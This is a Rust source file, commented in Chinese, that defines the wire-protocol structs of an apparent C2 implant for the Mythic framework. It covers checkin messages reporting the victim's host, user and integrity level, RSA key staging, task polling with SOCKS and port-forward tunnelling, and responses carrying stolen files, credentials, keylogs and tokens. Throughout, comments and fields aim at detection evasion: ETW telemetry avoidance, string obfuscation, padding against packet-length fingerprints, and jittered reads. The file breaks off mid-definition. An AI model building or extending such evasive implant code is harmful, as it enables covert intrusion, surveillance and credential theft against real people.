extern crate alloc;

use alloc::string::String;
use alloc::vec::Vec;
use serde::{Deserialize, Serialize};
pub use crate::buffer::StackVec;

// ==========================================
// 1. 继承与重导出 crate 根命名空间生效配置、常量与预算类型
// ==========================================
pub use crate::{
    ActiveBudget, ActiveStackWorkspace, DefaultStackWorkspace,
    BUFFER_SIZE, ACTIVE_WIRE_SIZE, B64Buffer, RawBuffer,
    Budget16K, Budget4K, Budget64K,
    StackWorkspace16K, StackWorkspace4K, StackWorkspace64K,
    CIPHERTEXT_LEN_16K, CIPHERTEXT_LEN_4K, CIPHERTEXT_LEN_64K,
    MAX_B64_LEN, MAX_CIPHERTEXT_LEN, MAX_PLAINTEXT_LEN, MAX_RAW_LEN, MAX_RAW_READ,
    PLAINTEXT_LEN_16K, PLAINTEXT_LEN_4K, PLAINTEXT_LEN_64K,
    PROTOCOL_OVERHEAD,
    RAW_LEN_16K, RAW_LEN_4K, RAW_LEN_64K,
    RAW_READ_16K, RAW_READ_4K, RAW_READ_64K,
    WIRE_SIZE_16K, WIRE_SIZE_4K, WIRE_SIZE_64K,
};

// ==========================================
// 5. 动态分片编码与多桶调度 (Multi-Bucket Morphing)
// ==========================================

/// 传输桶档位 (Multi-Bucket Morphing)
#[derive(PartialEq, Eq, Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub enum DynamicBudget {
    Small,
    Medium,
    Large,
}

impl DynamicBudget {
    /// 根据待发载荷大小和隐蔽策略，动态选择规格并返回带 Jitter 的读取尺寸
    pub fn select_jittered_read(required_raw_len: usize) -> usize {
        if required_raw_len <= Budget4K::MAX_RAW_READ {
            Budget4K::jittered_raw_read()
        } else if required_raw_len <= Budget16K::MAX_RAW_READ {
            Budget16K::jittered_raw_read()
        } else {
            Budget64K::jittered_raw_read()
        }
    }

    /// 获取当前档位的目标网络出网包容量
    #[inline(always)]
    pub const fn wire_size(self) -> usize {
        match self {
            DynamicBudget::Small => Budget4K::MAX_B64_LEN,
            DynamicBudget::Medium => Budget16K::MAX_B64_LEN,
            DynamicBudget::Large => Budget64K::MAX_B64_LEN,
        }
    }
}

// ==========================================
// 6. 协议解析与状态错误代号 (Protocol Status Codes)
// ==========================================

// 统一由 crate::error 收敛导出，保持全局错误代号密码本契约
pub use crate::error::ModelError;


// ==========================================
// 2. Initial Checkin & Key Exchange (上线注册与密钥协商)
// ==========================================

/// 上线注册请求包 (Agent -> Mythic Server)
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/initial-checkin
/// 采用零拷贝借用切片 (`&'a str`)，杜绝 Windows 10/11 Segment Heap 高频堆抖动与 ETW-Ti 遥测
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct CheckinMessage<'a> {
    /// 动作标志，固定为 "checkin"
    pub action: &'a str,
    /// 当前 Agent Payload 的初始 UUID (36 字节)
    pub uuid: &'a str,
    /// 主机 IP 地址列表 (支持多网卡枚举，严格对齐 Mythic 4.0 官方规范 "ips": ["..."])
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ips: Option<&'a [&'a str]>,
    /// 操作系统版本信息 (例如 "Windows 11 Pro 23H2 10.0.22631")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub os: Option<&'a str>,
    /// 运行该 Agent 的当前用户凭据 (如 "SYSTEM" 或 "DOMAIN\\User")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub user: Option<&'a str>,
    /// 目标计算机名 (如 "DESKTOP-VICTIM")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub host: Option<&'a str>,
    /// Agent 当前宿主进程 PID
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pid: Option<u32>,
    /// 系统架构类型 (如 "x64" / "x86" / "arm64")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub architecture: Option<&'a str>,
    /// 主机所在域名或工作组
    #[serde(skip_serializing_if = "Option::is_none")]
    pub domain: Option<&'a str>,
    /// Windows 进程完整性级别 (1: Low, 2: Medium, 3: High/Admin, 4: SYSTEM)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub integrity_level: Option<u8>,
    /// 目标出口公网 IP (若已知)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub external_ip: Option<&'a str>,
    /// 动态协商加密密钥的 Base64 文本 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub encryption_key: Option<&'a str>,
    /// 动态协商解密密钥的 Base64 文本 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub decryption_key: Option<&'a str>,
    /// 当前进程可执行文件名称 (如 "svchost.exe" 或 "thanatos.exe")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub process_name: Option<&'a str>,
    /// 附加描述信息
    #[serde(skip_serializing_if = "Option::is_none")]
    pub extra_info: Option<&'a str>,
    /// 动态混淆字段：使用 &'a str 零拷贝借用切片
    #[serde(skip_serializing_if = "Option::is_none")]
    pub _p: Option<&'a str>,
}

impl<'a> CheckinMessage<'a> {
    #[inline]
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        uuid: &'a str,
        ips: &'a [&'a str],
        os: &'a str,
        user: &'a str,
        host: &'a str,
        pid: u32,
        architecture: &'a str,
        domain: &'a str,
    ) -> Self {
        Self {
            action: "checkin",
            uuid,
            ips: Some(ips),
            os: Some(os),
            user: Some(user),
            host: Some(host),
            pid: Some(pid),
            architecture: Some(architecture),
            domain: Some(domain),
            integrity_level: None,
            external_ip: None,
            encryption_key: None,
            decryption_key: None,
            process_name: None,
            extra_info: None,
            _p: None,
        }
    }

    #[inline]
    pub fn with_integrity_level(mut self, level: u8) -> Self {
        self.integrity_level = Some(level);
        self
    }

    #[inline]
    pub fn with_process_name(mut self, process_name: &'a str) -> Self {
        self.process_name = Some(process_name);
        self
    }

    #[inline]
    pub fn with_extra_info(mut self, extra_info: &'a str) -> Self {
        self.extra_info = Some(extra_info);
        self
    }

    #[inline]
    pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
        self._p = padding;
        self
    }

    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action != obfstr::obfstr!("checkin") {
            return Err(ModelError::InvalidAction);
        }
        if self.uuid.len() != 36 {
            return Err(ModelError::MissingRequiredField);
        }
        Ok(())
    }
}

/// 服务端上线确认响应包 (Mythic Server -> Agent)
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerCheckinResponse<'a> {
    #[serde(borrow)]
    pub action: &'a str,
    #[serde(borrow)]
    pub status: &'a str,
    /// 成功注册后分配的新 Callback UUID (取代初始 Payload UUID)
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub id: Option<&'a str>,
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub error: Option<&'a str>,
}

impl<'a> ServerCheckinResponse<'a> {
    #[inline]
    pub fn new(action: &'a str, status: &'a str, id: Option<&'a str>) -> Self {
        Self {
            action,
            status,
            id,
            error: None,
        }
    }

    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action != obfstr::obfstr!("checkin") {
            return Err(ModelError::InvalidAction);
        }
        if self.status != obfstr::obfstr!("success") {
            return Err(ModelError::ResponseStatusError);
        }
        Ok(())
    }

    /// 将服务端下发的 Callback UUID (36 字节) 拷贝至外部固定栈/静态暂存区，切断明文借用
    pub fn copy_id_to(&self, dest: &mut [u8; 36]) -> Result<bool, ModelError> {
        if let Some(id_str) = self.id {
            if id_str.len() == 36 {
                dest.copy_from_slice(id_str.as_bytes());
                return Ok(true);
            }
            return Err(ModelError::MissingRequiredField);
        }
        Ok(false)
    }
}

/// 客户端 RSA 密钥置换握手请求 (EKE Staging)
/// 
/// 对应官方文档: staging_rsa 动作
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct StagingRsaMessage<'a> {
    #[serde(borrow)]
    pub action: &'a str,
    #[serde(borrow)]
    pub pub_key: &'a str,
    #[serde(borrow)]
    pub session_id: &'a str,
}

/// 服务端 RSA 握手响应
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerStagingRsaResponse<'a> {
    #[serde(borrow)]
    pub action: &'a str,
    #[serde(borrow)]
    pub uuid: &'a str,
    #[serde(borrow)]
    pub session_key: &'a str,
    #[serde(borrow)]
    pub session_id: &'a str,
}

// ==========================================
// 3. Get Tasking (心跳轮询与任务拉取)
// ==========================================

/// 心跳轮询拉取任务请求包 (Agent -> Mythic Server)
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/action_get_tasking
/// 在一个心跳报文中可顺风车捎带 (Piggyback) SOCKS、RPFWD、P2P Delegates 和告警
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct GetTaskingMessage<'a> {
    pub action: &'a str,
    /// 单次轮询期望获取的最大任务数量 (标准为 1, -1 为全部拉取)
    pub tasking_size: i32,
    /// 是否同时获取下挂 P2P 代理节点的任务 (默认 true)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub get_delegate_tasks: Option<bool>,
    /// 顺风车捎带任务执行回执切片 (Piggybacking responses: 允许在单次心跳中回传结果/分片并拉取新任务)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub responses: Option<&'a [TaskResponseItem<'a>]>,
    /// P2P 消息中继切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub delegates: Option<&'a [DelegateMessage<'a>]>,
    /// 顺风车 SOCKS 流量切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub socks: Option<&'a [SocksMsg<'a>]>,
    /// 顺风车反向端口转发流量切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub rpfwd: Option<&'a [RpfwdMsg<'a>]>,
    /// 交互式终端消息切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub interactive: Option<&'a [InteractiveMsg<'a>]>,
    /// 全局系统告警消息切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub alerts: Option<&'a [AlertMsg<'a>]>,
    /// P2P 路由拓扑连接状态变更切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub edges: Option<&'a [EdgeMsg<'a>]>,
    /// 动态混淆字段：打破空心跳的恒定包长指纹
    #[serde(skip_serializing_if = "Option::is_none")]
    pub _p: Option<&'a str>,
}

impl<'a> Default for GetTaskingMessage<'a> {
    #[inline]
    fn default() -> Self {
        Self {
            action: "get_tasking",
            tasking_size: 1,
            get_delegate_tasks: None,
            responses: None,
            delegates: None,
            socks: None,
            rpfwd: None,
            interactive: None,
            alerts: None,
            edges: None,
            _p: None,
        }
    }
}

impl<'a> GetTaskingMessage<'a> {
    #[inline]
    pub fn new(tasking_size: i32) -> Self {
        Self {
            tasking_size,
            ..Self::default()
        }
    }

    #[inline]
    pub fn with_responses(mut self, responses: &'a [TaskResponseItem<'a>]) -> Self {
        self.responses = Some(responses);
        self
    }

    #[inline]
    pub fn with_edges(mut self, edges: &'a [EdgeMsg<'a>]) -> Self {
        self.edges = Some(edges);
        self
    }

    #[inline]
    pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
        self._p = padding;
        self
    }
}

/// 服务端下发的单条指令项 (零拷贝借用版本)
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct MythicTaskRef<'a> {
    /// 任务唯一 UUID
    #[serde(borrow)]
    pub id: &'a str,
    /// 指令名称 (如 "shell", "whoami", "download", "upload", "exit")
    #[serde(borrow)]
    pub command: &'a str,
    /// 指令参数文本 (JSON 字符串或纯命令行参数)
    #[serde(borrow, default)]
    pub parameters: &'a str,
    /// 任务下发时间戳 (Unix 浮点时间)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub timestamp: Option<f64>,
    /// 关联的 Windows 访问令牌 ID (若操作员指定了运行 Token)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub token_id: Option<u32>,
    /// 兼容 64 位令牌句柄/ID
    #[serde(skip_serializing_if = "Option::is_none")]
    pub token: Option<u64>,
}

impl<'a> MythicTaskRef<'a> {
    #[inline]
    pub fn new(id: &'a str, command: &'a str, parameters: &'a str) -> Self {
        Self {
            id,
            command,
            parameters,
            timestamp: None,
            token_id: None,
            token: None,
        }
    }

    /// 转换为拥有所有权的结构体，便于跨线程移交至后台 Worker 线程
    pub fn to_owned(&self) -> MythicTask {
        MythicTask {
            id: String::from(self.id),
            command: String::from(self.command),
            parameters: String::from(self.parameters),
            timestamp: self.timestamp,
            token_id: self.token_id,
            token: self.token,
        }
    }
}

/// 拥有所有权版本的单条任务定义 (用于长周期后台并发执行)
#[derive(Clone, Serialize, Deserialize, PartialEq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct MythicTask {
    pub id: String,
    pub command: String,
    #[serde(default)]
    pub parameters: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub timestamp: Option<f64>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub token_id: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub token: Option<u64>,
}

/// 服务端响应 GetTasking 的反序列化外壳 (借用字符串，列表使用 Vec 承载)
#[derive(Clone, Serialize, Deserialize, PartialEq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerTaskingResponseRef<'a> {
    #[serde(borrow)]
    pub action: &'a str,
    #[serde(borrow, default)]
    pub status: Option<&'a str>,
    /// 待执行的任务清单 (采用纯栈式 StackVec，零堆分配)
    #[serde(borrow, default)]
    pub tasks: StackVec<MythicTaskRef<'a>, 16>,
    /// 服务端对顺风车捎带 responses 的处理确认回执 (例如返回 file_id 等)
    #[serde(borrow, default)]
    pub responses: Option<StackVec<ServerTaskPostResponseItem<'a>, 16>>,
    /// 下发给 P2P 代理节点的消息
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub delegates: Option<StackVec<DelegateMessage<'a>, 8>>,
    /// 下发给 Agent 的 SOCKS 流量
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub socks: Option<StackVec<SocksMsg<'a>, 32>>,
    /// 下发给 Agent 的 RPFWD 流量
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub rpfwd: Option<StackVec<RpfwdMsg<'a>, 32>>,
    /// 下发给 Agent 的交互式终端输入
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub interactive: Option<StackVec<InteractiveMsg<'a>, 16>>,
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub error: Option<&'a str>,
}

/// 服务端响应 GetTasking 的拥有所有权结构体 (Mythic Server -> Agent)
///
/// 注意：该结构体涉及堆分配且不包含多路复用隧道流量 (socks/rpfwd/interactive/delegates)。
/// 推荐在热点通信路径全面使用零堆分配纯栈式的 [`ServerTaskingResponseRef`]。
#[deprecated(note = "建议优先使用零堆分配纯栈式 ServerTaskingResponseRef 以规避堆碎片并完整支持隧道多路复用")]
#[derive(Clone, Serialize, Deserialize, PartialEq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerTaskingResponse {
    pub action: String,
    pub status: String,
    #[serde(default)]
    pub tasks: Vec<MythicTask>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub error: Option<String>,
}

// ==========================================
// 4. Post Response (命令执行回执与批量回传)
// ==========================================

/// 批量任务回执请求包 (Agent -> Mythic Server)
///
/// 对应官方文档: /customizing/payload-type-development/create_tasking/agent-side-coding/action-post_response
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct PostResponseMessage<'a> {
    pub action: &'a str,
    /// 命令回执条目数组切片
    pub responses: &'a [TaskResponseItem<'a>],
    /// 顺风车转发 P2P 消息切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub delegates: Option<&'a [DelegateMessage<'a>]>,
    /// 顺风车 SOCKS 流量切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub socks: Option<&'a [SocksMsg<'a>]>,
    /// 顺风车 RPFWD 流量切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub rpfwd: Option<&'a [RpfwdMsg<'a>]>,
    /// 交互式终端消息切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub interactive: Option<&'a [InteractiveMsg<'a>]>,
    /// 全局告警切片 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub alerts: Option<&'a [AlertMsg<'a>]>,
    /// P2P 路由拓扑连接状态变更 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub edges: Option<&'a [EdgeMsg<'a>]>,
    /// 动态混淆字段：使任务回传数据包在边界内自然浮动
    #[serde(skip_serializing_if = "Option::is_none")]
    pub _p: Option<&'a str>,
}

impl<'a> PostResponseMessage<'a> {
    #[inline]
    pub fn new(responses: &'a [TaskResponseItem<'a>]) -> Self {
        Self {
            action: "post_response",
            responses,
            delegates: None,
            socks: None,
            rpfwd: None,
            interactive: None,
            alerts: None,
            edges: None,
            _p: None,
        }
    }

    #[inline]
    pub fn with_padding(mut self, padding: Option<&'a str>) -> Self {
        self._p = padding;
        self
    }
}

/// 服务端对 post_response 的确认回执包 (Mythic Server -> Agent)
///
/// 严格遵循 Mythic 4.0 官方规范：反序列化 Task ACK 状态以及服务端下发的隧道流量 (socks, rpfwd, interactive)，
/// 采用零堆分配纯栈式 StackVec 承载。
#[derive(Clone, Serialize, Deserialize, PartialEq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerPostResponse<'a> {
    #[serde(borrow)]
    pub action: &'a str,
    #[serde(borrow, default)]
    pub responses: StackVec<ServerTaskPostResponseItem<'a>, 16>,
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub delegates: Option<StackVec<DelegateMessage<'a>, 8>>,
    /// 服务端下发给 Agent 的 SOCKS 代理流量
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub socks: Option<StackVec<SocksMsg<'a>, 32>>,
    /// 服务端下发给 Agent 的 RPFWD 流量
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub rpfwd: Option<StackVec<RpfwdMsg<'a>, 32>>,
    /// 服务端下发给 Agent 的交互式终端输入
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub interactive: Option<StackVec<InteractiveMsg<'a>, 16>>,
}

/// 服务端对单条 task 回执的处理状态项
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerTaskPostResponseItem<'a> {
    #[serde(borrow)]
    pub task_id: &'a str,
    #[serde(borrow)]
    pub status: &'a str,
    #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
    pub error: Option<&'a str>,

    // === 文件下载与断点续传确认字段 (Agent -> Mythic) ===
    /// 注册成功或断点续传时，Mythic 分配/确认的 File UUID
    #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
    pub file_id: Option<&'a str>,
    /// 文件总大小 (字节，断点续传时下发)
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub total_size: Option<i64>,
    /// 服务端首个缺失的字节偏移量 (Offset 模式断点续传核心字段)
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub chunk_offset: Option<u64>,
    /// 传输协议类型 (如 "offset" 或 "chunk")
    #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
    pub transfer_type: Option<&'a str>,

    // === 传统序号分片模式兼容与文件上传字段 (Mythic -> Agent) ===
    /// 总分片数
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub total_chunks: Option<u32>,
    /// 当前分片序号 (1-based)
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub chunk_num: Option<u32>,
    /// 单分片大小
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub chunk_size: Option<u32>,
    /// 服务端下发的文件切片 Base64 载荷 (File Upload 场景)
    #[serde(borrow, skip_serializing_if = "Option::is_none", default)]
    pub chunk_data: Option<&'a str>,
}

/// 单条任务的执行回执或特征挂载项 (Task Response Item)
///
/// 支撑 Mythic 4.0 绝大部分 Hooking Features (下载、上传、进程树、文件浏览、凭据、痕迹等)
#[derive(Clone, Copy, Serialize, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TaskResponseItem<'a> {
    /// 对应的 Task UUID (36 字节)
    pub task_id: &'a str,
    /// 终端控制台常规输出文本
    pub user_output: &'a str,
    /// 任务是否已完全结束
    pub completed: bool,
    /// 可选的状态标识 (如 "success", "error", "error: reason")
    #[serde(skip_serializing_if = "Option::is_none")]
    pub status: Option<&'a str>,
    /// 需交由后端翻译容器二次处理的载荷数据 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub process_response: Option<&'a str>,

    // === Hooking 挂载字段 ===
    /// 文件下载注册与数据切片挂载 (Agent -> Mythic)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub download: Option<FileDownloadResponse<'a>>,
    /// 文件上传拉取请求挂载 (Mythic -> Agent)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub upload: Option<FileUploadRequest<'a>>,
    /// 进程列表数据挂载 (Process Browser)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub processes: Option<ProcessBrowserResponse<'a>>,
    /// 文件目录结构挂载 (File Browser)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_browser: Option<FileBrowserResponse<'a>>,
    /// 文件删除同步挂载 (File Browser 划线删除)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub removed_files: Option<&'a [RemovedFileItem<'a>]>,
    /// 凭据发现数据挂载
    #[serde(skip_serializing_if = "Option::is_none")]
    pub credentials: Option<&'a [CredentialItem<'a>]>,
    /// 痕迹清理与审计数据挂载
    #[serde(skip_serializing_if = "Option::is_none")]
    pub artifacts: Option<&'a [ArtifactItem<'a>]>,
    /// Windows 访问令牌列表挂载
    #[serde(skip_serializing_if = "Option::is_none")]
    pub tokens: Option<&'a [TokenItem<'a>]>,
    /// 会话可用令牌变更挂载
    #[serde(skip_serializing_if = "Option::is_none")]
    pub callback_tokens: Option<&'a [CallbackTokenItem<'a>]>,
    /// 键盘记录按键流挂载
    #[serde(skip_serializing_if = "Option::is_none")]
    pub keylogs: Option<&'a [KeylogItem<'a>]>,
    /// 任务内嵌事件告警挂载
    #[serde(skip_serializing_if = "Option::is_none")]
    pub alerts: Option<&'a [AlertMsg<'a>]>,
    /// 异步 Agent RPC 请求挂载 (Mythic 4.0)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub agent_rpc: Option<AgentRpcRequest<'a>>,

    // === 通用分片字段 ===
    #[serde(skip_serializing_if = "Option::is_none")]
    pub file_id: Option<&'a str>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_num: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub total_chunks: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_data: Option<&'a str>,
}

impl<'a> TaskResponseItem<'a> {
    #[inline]
    pub fn new(task_id: &'a str, user_output: &'a str, completed: bool) -> Self {
        Self {
            task_id,
            user_output,
            completed,
            ..Default::default()
        }
    }

    #[inline]
    pub fn with_status(mut self, status: &'a str) -> Self {
        self.status = Some(status);
        self
    }

    #[inline]
    pub fn with_removed_files(mut self, removed_files: &'a [RemovedFileItem<'a>]) -> Self {
        self.removed_files = Some(removed_files);
        self
    }
}

// ==========================================
// 5. Hooking Features: File Transfer (文件上传与下载)
// ==========================================

/// 文件下载报文 (Agent -> Mythic)
///
/// 对应官方文档: /customizing/hooking-features/download
/// 纯粹的【Offset 字节偏移模式】(0-based 字节偏移量)，彻底剔除 Chunk 序号模式
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileDownloadResponse<'a> {
    /// 首次注册传输时的文件总字节数 (Offset 模式，支持负数如 -1 代表流式未知长度)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub total_size: Option<i64>,
    /// 单片固定大小 (可选)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_size: Option<u32>,
    /// 目标主机上的完整路径 (如 "C:\\Users\\admin\\Desktop\\data.zip")
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub full_path: Option<&'a str>,
    /// 目标主机名称
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub host: Option<&'a str>,
    /// 文件显示名
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub filename: Option<&'a str>,
    /// 是否作为屏幕截图归档 (默认 false)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub is_screenshot: Option<bool>,

    // === 后续数据回传字段 ===
    /// Mythic 分配的 File UUID
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub file_id: Option<&'a str>,
    /// 当前切片的字节偏移 (从 0 开始, Offset 模式)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub chunk_offset: Option<u64>,
    /// Base64 编码的二进制分片载荷
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub chunk_data: Option<&'a str>,
    /// 是否申请断点续传 (Mythic 4.0)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub resume: Option<bool>,
}

impl<'a> FileDownloadResponse<'a> {
    /// 构造 Offset 模式首次注册报文
    #[inline]
    pub const fn new_offset_register(
        total_size: i64,
        filename: Option<&'a str>,
        full_path: Option<&'a str>,
        host: Option<&'a str>,
        is_screenshot: bool,
    ) -> Self {
        Self {
            total_size: Some(total_size),
            chunk_size: None,
            full_path,
            host,
            filename,
            is_screenshot: Some(is_screenshot),
            file_id: None,
            chunk_offset: None,
            chunk_data: None,
            resume: None,
        }
    }

    /// 构造 Offset 模式数据切片报文
    #[inline]
    pub const fn new_offset_chunk(
        file_id: &'a str,
        chunk_offset: u64,
        chunk_data: &'a str,
    ) -> Self {
        Self {
            total_size: None,
            chunk_size: None,
            full_path: None,
            host: None,
            filename: None,
            is_screenshot: None,
            file_id: Some(file_id),
            chunk_offset: Some(chunk_offset),
            chunk_data: Some(chunk_data),
            resume: None,
        }
    }

    /// 构造断点续传 (Resume) 申请报文
    #[inline]
    pub const fn new_resume_request(file_id: &'a str) -> Self {
        Self {
            total_size: None,
            chunk_size: None,
            full_path: None,
            host: None,
            filename: None,
            is_screenshot: None,
            file_id: Some(file_id),
            chunk_offset: None,
            chunk_data: None,
            resume: Some(true),
        }
    }
}

/// 文件上传拉取请求 (Mythic -> Agent)
///
/// 对应官方文档: /customizing/hooking-features/action-upload
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileUploadRequest<'a> {
    /// 请求的分片大小 (字节)
    pub chunk_size: u32,
    /// 待下载文件的 UUID
    #[serde(borrow)]
    pub file_id: &'a str,
    /// 当前期待拉取的分片序号 (从 1 开始)
    pub chunk_num: u32,
    /// 若写入磁盘，报告其目标完整路径
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub full_path: Option<&'a str>,
}

/// 服务端下发的文件上传响应切片
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ServerFileUploadResponse<'a> {
    #[serde(borrow)]
    pub status: &'a str,
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub error: Option<&'a str>,
    pub total_chunks: u32,
    pub chunk_num: u32,
    #[serde(borrow)]
    pub chunk_data: &'a str,
    #[serde(borrow)]
    pub file_id: &'a str,
    #[serde(borrow)]
    pub task_id: &'a str,
}

/// 兼容 Wisconsin 现有的通用大文件流式切片载荷
#[derive(Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileChunkPayload<'a> {
    #[serde(borrow)]
    pub action: &'a str,
    #[serde(borrow)]
    pub file_id: &'a str,
    pub chunk_num: u32,
    pub total_chunks: u32,
    #[serde(borrow)]
    pub chunk_data: &'a str,
    #[serde(borrow, skip_serializing_if = "Option::is_none")]
    pub task_id: Option<&'a str>,
}

impl<'a> FileChunkPayload<'a> {
    #[inline(always)]
    pub fn is_last_chunk(&self) -> bool {
        self.chunk_num == self.total_chunks
    }

    pub fn validate(&self) -> Result<(), ModelError> {
        if self.action.is_empty() {
            return Err(ModelError::InvalidAction);
        }
        if self.file_id.is_empty() {
            return Err(ModelError::MissingRequiredField);
        }
        if self.chunk_num == 0 || self.chunk_num > self.total_chunks {
            return Err(ModelError::InvalidChunkInfo);
        }
        if self.is_last_chunk() && self.chunk_data.is_empty() && self.total_chunks > 1 {
            return Err(ModelError::InvalidChunkInfo);
        }
        if !self.chunk_data.len().is_multiple_of(4) {
            return Err(ModelError::InvalidChunkInfo);
        }
        Ok(())
    }
}


// ==========================================
// 6. Hooking Features: Process Browser (进程树)
// ==========================================

/// 进程列表回显外壳 (Process Browser)
///
/// 对应官方文档: /customizing/hooking-features/process_list
#[derive(Clone, Copy, Serialize, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ProcessBrowserResponse<'a> {
    /// 目标计算机名
    pub host: &'a str,
    /// 操作系统标识 (如 "windows")
    pub os: &'a str,
    /// 若为 true，通知 Mythic 将未包含在本次列表中的历史进程标记为已退出
    #[serde(skip_serializing_if = "Option::is_none")]
    pub update_deleted: Option<bool>,
    /// 进程详情数组切片
    pub processes: &'a [ProcessItem<'a>],
}

/// 单个进程条目详情
